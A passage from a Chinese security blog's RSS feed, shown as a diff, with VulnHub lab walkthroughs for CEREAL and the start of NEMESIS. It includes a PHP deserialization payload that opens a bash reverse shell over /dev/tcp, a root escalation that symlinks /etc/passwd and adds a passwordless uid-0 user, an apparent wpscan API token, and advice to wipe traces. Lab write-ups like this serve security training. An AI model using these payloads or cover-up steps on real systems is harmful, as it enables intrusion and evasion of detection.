+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在环境变量里边添加figlet表示以一种方式去打印后面跟的字母或者数字&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt;&amp;gt; ~/.bashrc &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;figlet I\&amp;#x27;m X_T&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;检查这个文件是否完整的写入到了环境变量里边&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.bashrc | tail -n1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1239.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;vim ~/.bashrcs 删除此条信息则不会在显示这条&lt;/p&gt;
+&lt;h3 id=&#34;一键删除登录信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一键删除登录信息&#34;&gt;#&lt;/a&gt; 一键删除登录信息&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;如果显示的信息太多了，影响视觉，有没有办法一键全部删除掉，答案是肯定的，在每个用户下执行创建.hushlogin 文件，则所有非环境变量里边的信息都再不会被显示出来&lt;br&gt;
+ for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do touch /home/$USER/.hushlogin;done;touch /root/.hushlogin&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1240.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;一键删除阻碍登陆日志信息输出的文件：&lt;br&gt;
+for USER in `cat /etc/passwd | grep /bin/bash |grep -v root | cut -d “:” -f 1` ;do rm -f /home/$USER/.hushlogin;done;rm -f /root/.hushlogin&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1241.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;根据以上的信息就可以自定义 ssh 登陆的信息自定义的设置，当然最后记得复原，并且删除自己操作过的痕迹，防止被知道自己操作过什么。&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/144%20CEREAL/</guid>
+            <title>VULNHUB 44 CEREAL</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/144%20CEREAL/</link>
+            <category>VULNHUB 41-50</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==&#34;&gt;https://www.vulnhub.com/entry/cereal-1,703/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==&#34;&gt;https://www.cnblogs.com/sainet/p/15779414.html&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
+ 靶机 CEREAL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
+由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1305.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;2 ）粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1306.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31. 83&lt;br&gt;
+ 靶机开放端口 21 , 22 , 80 , 139 , 445 , 3306 , 11111 , 55555&lt;/p&gt;
+&lt;p&gt;3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1307.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;检索到的有效服务如下所示&lt;br&gt;
+ 21 ftp：可尝试进行匿名登陆下载文件&lt;br&gt;
+ 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
+ 80 、44441 http：可对 web 进行渗透测试收集信息&lt;br&gt;
+ 3306 mysql：可进行自制字典爆破或社工收集账户密码&lt;br&gt;
+ 139 端口，是 NetBIOS 会话服务端口，主要用于提供 Windows 文件和打印机共享以及 UNIX 中的 Samba 服务。可进行 smb 利用。&lt;br&gt;
+445 端口，通过它可以在局域网中轻松访问各种共享文件夹或共享打印机，能通过该端口共享硬盘。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;注意到有很多服务名字是 tcpwrapped：&lt;br&gt;
+这说明 tcp 三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为 tcpwrapped 时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;ftp-匿名访问&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名访问&#34;&gt;#&lt;/a&gt; FTP 匿名访问&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;ZnRwOi8vMTkyLjE2OC4zMS44Mw==&#34;&gt;ftp://192.168.31.83&lt;/span&gt; 进行 ftp 信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1308.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;有一个空文件夹 pub、没有更多的详细信息暴露出来&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMv&#34;&gt;http://192.168.31.83/&lt;/span&gt; 进行 web 信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1309.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;对页面到处点了点之后，没有看到可以直接利用的点。包括查看 robots 文件、查看网页源代码，查看是否有 git 文件泄漏，查看网站的框架、CMS 是否有可以直接利用的漏洞，查看页面中是否有敏感信息暴露出来如可疑的域名。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;接下来就对网站进行目录扫描，扫描是否存在敏感的目录，指定后缀与字典开扫，我喜欢用的字典是 directory-list-2.3-medium.txt 比较全。&lt;br&gt;
+ &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.83/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1310.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;依次对识别到的目录进行访问：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMvYmxvZy8=&#34;&gt;http://192.168.31.83/blog/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1311.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找到了两条信息，域名 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2NlcmVhbC5jdGY=&#34;&gt;http://cereal.ctf&lt;/span&gt; , 另一个看网站的形式像是 wordpress.&lt;/p&gt;
+&lt;p&gt;修改本地 hosts 文件，将域名的 DNS 解析指向靶机 ip 地址。&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1312.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;再次打开网站，看一下页面有啥变化&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1313.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;wpscan-枚举&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wpscan-枚举&#34;&gt;#&lt;/a&gt; wpscan 枚举&lt;/h3&gt;
+&lt;p&gt;用 wpscan 进行一波扫描，枚举用户名&lt;br&gt;
+ &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://cereal.ctf/blog/ --enumerate u&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1314.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 得到两个用户名分别为 cereal 和 Cereal&lt;/p&gt;
+&lt;p&gt;一般只能收集到用户名、密码能收集到的情况比较少、我们就搜集一下试试&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc -U &#39;cereal,Cereal&#39; -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --url http://cereal.ctf/blog/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1315.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;果然密码搜集不出来，但是知道了域名的话就可以尝试目标网站是否存在子域名&lt;/p&gt;
+&lt;p&gt;尝试搜索子域名后无果，继续访问我们收集到的其他 web&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODMvYWRtaW4v&#34;&gt;http://192.168.31.83/admin/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1316.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;一个后台的登陆地址，可以尝试弱口令，万能密码，sql 注入、burp 代理数据修改返回包、爆破密码、xss 攻击等。简单的试了试之后发现并没有什么很严重的弱点，就把现在的目标转到其他的网站上。&lt;/p&gt;
+&lt;h3 id=&#34;子域名收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#子域名收集&#34;&gt;#&lt;/a&gt; 子域名收集&lt;/h3&gt;
+&lt;p&gt;收集另一个开放的 web 站点的信息：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODM6NDQ0NDE=&#34;&gt;http://192.168.31.83:44441&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1317.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;收集这个站点的目录并没有什么有价值的信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1318.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;收集 44441 端口上是否存在一些子域名&lt;br&gt;
+ &lt;code&gt;gobuster vhost -u http://cereal.ctf:44441 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1319.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;收集到了子域名 secure.cereal.ctf:44441&lt;/p&gt;
+&lt;p&gt;修改本地 hosts 文件，改变 DNS 解析指向为靶机 ip 地址&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1320.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;经过上述的信息收集，我们能得到的可以利用的漏洞很有可能就是在后来发现的这个子域名上。&lt;/p&gt;
+&lt;h3 id=&#34;继续信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#继续信息收集&#34;&gt;#&lt;/a&gt; 继续信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3NlY3VyZS5jZXJlYWwuY3RmOjQ0NDQx&#34;&gt;http://secure.cereal.ctf:44441&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1321.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;发现了命令执行，但是输入；&amp;amp;| 都没有起作用后，截取数据包，看数据包中的内容是些什么&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1322.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;可以选在 burp 自带的 url 解码，也可以在线 url 解码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1323.png&#34; width=&#34;640&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;如图依次点击可将原先的编码进行 url 解码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1324.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;这是一个 php 反序列化漏洞，但是如果找不到源码的话很难去利用这个漏洞，寻找这个子域名下是否有一些目录存在&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1325.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;扫的比较慢，而且大半天也没有什么发现&lt;/p&gt;
+&lt;h3 id=&#34;ffuf模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ffuf模糊测试&#34;&gt;#&lt;/a&gt; ffuf 模糊测试&lt;/h3&gt;
+&lt;p&gt;换个字典换个工具跑  &lt;code&gt;ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1326.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找到了一个 back_en 的备份文件夹&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1327.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;打开之后发现是没有权限去进入这个目录&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1328.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;但是这个目录是确实存在的，继续向下扫描看能否找到敏感文件&lt;br&gt;
+ &lt;code&gt;gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://secure.cereal.ctf:44441/back_en/&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1329.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;找到一个备份文件 index.php.bak, 打开之后发现了源码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1330.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;php反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反序列化&#34;&gt;#&lt;/a&gt; php 反序列化&lt;/h3&gt;
+&lt;p&gt;看源代码可以规范代码的格式，阅读此处的 php 代码查看反序列化造成的原因&lt;br&gt;
+ &lt;code&gt;view-source:http://secure.cereal.ctf:44441/back_en/index.php.bak&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1331.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;isValid 默认为 False，从浏览器发送请求时，会进入 if，并检查该值是否为 IP 地址。&lt;br&gt;
+尝试注入命令时，它拒绝了输入，如果我们在请求中发送值 True，则根本不会执行 if 块。&lt;br&gt;
+会直接调用 ping 方法。通过 shell_exec 函数执行命令。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;需要先实例化、在进行序列化和url编码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class pingTest &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public $ipAddress = &amp;quot;;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.18/4444 0&amp;gt;&amp;amp;1 &amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  public $isValid = True;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;obj = NEW pingTest;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;serilaze= serialize(&lt;span class=&#34;variable&#34;&gt;$obj&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo urlencode($serilaze);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;可以在线 php 执行，输出内容如下&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1332.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;也可以用 php 去执行下面的代码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1333.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到漏洞利用代码：&lt;br&gt;
+ &lt;code&gt;O%3A8%3A%22pingTest%22%3A2%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A45%3A%22%3Bbash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.31.15%2F4444+0%3E%261+%22%3Bs%3A7%3A%22isValid%22%3Bb%3A1%3B%7D&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;将 payload 发送到 burp 中，用 burp 发送此恶意数据&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1334.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;同时在 kali 上监听端口，得到了反弹的 shell，并进行终端优化&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1335.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;ln-软连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ln-软连接&#34;&gt;#&lt;/a&gt; ln 软连接&lt;/h3&gt;
+&lt;p&gt;上 pspy 监控看看，看到了一个脚本被定期执行&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1336.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;chown 是用来改变用户和用户组权限的，这个脚本可以更改位于用户 rocky 的主目录中的文件 public_html 内容的所有者，当前用户 apache 组，apache 用户可以访问目录中的文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1337.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;尝试直接修改 /etc/passwd 中的用户，生成一个无密码的是 root 权限的账户&lt;br&gt;
+ &lt;code&gt;ln -s /etc/passwd /home/rocky/public_html/etcpasswd&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;ln -s&lt;/code&gt;  后，对添加软连接的地方做出改变则原文件也发生了改变&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1338.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;等待定时任务被执行后，/etc/passwd 就会因为我们设置的软连接&lt;br&gt;
+ /home/rocky/public_html/etcpasswd 的权限被修改为 rocky:apache，而&lt;br&gt;
+ /etc/passwd 的权限也被改变为了 apache 可操作的文件&lt;/p&gt;
+&lt;h3 id=&#34;root密码置空&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#root密码置空&#34;&gt;#&lt;/a&gt; root 密码置空&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;echo &amp;quot;mhq::0:0:root:/root:/bin/bash&amp;quot; &amp;gt;&amp;gt; /etc/passwd&lt;/code&gt; &lt;br&gt;
+ 删除了 x，也就是删除 root 用户的密码身份验证&lt;br&gt;
+通过 su mhq 可以直接无密码升级到 root 权限&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1339.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;可以检验一下，现在我们 root 密码仍然未知，但是 mhq 的用户密码 x 不存在&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1340.png&#34; width=&#34;410&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 可以直接通过一个普通用户提权到 root&lt;/p&gt;
  ]]></description>
         </item>
         <item>
@@ -515,6 +866,117 @@ socat -d -d file: &lt;code&gt;tty&lt;/code&gt; ,raw,echo=0 TCP-LISTEN:8080&lt;/p
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/146%20NEMESIS/</guid>
+            <title>VULNHUB 46 NEMESIS</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/146%20NEMESIS/</link>
+            <category>VULNHUB 41-50</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaWEtbmVtZXNpcy0xMDEsNTgyLw==&#34;&gt;https://www.vulnhub.com/entry/ia-nemesis-101,582/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS9uZW1lc2lzLXZ1bG5odWItd2Fsa3Rocm91Z2gv&#34;&gt;https://www.infosecarticles.com/nemesis-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
+ 靶机 NEMESIS：桥接于 192.168.0.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址和开放的端口&lt;br&gt;
+由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | uniq&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1399.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;2 ）粗略的识别一下该 ip 上开放了哪些端口&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1400.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.0.184 靶机开放端口 80&lt;/p&gt;
+&lt;p&gt;3 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1402.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;检索到的有效服务如下所示：&lt;br&gt;
+52846 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用&lt;br&gt;
+ 80 52845 http：可对 web 进行渗透测试收集信息&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xODQv&#34;&gt;http://192.168.0.184/&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1403.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;到处看了看，发现有一个用户名和密码&lt;/p&gt;
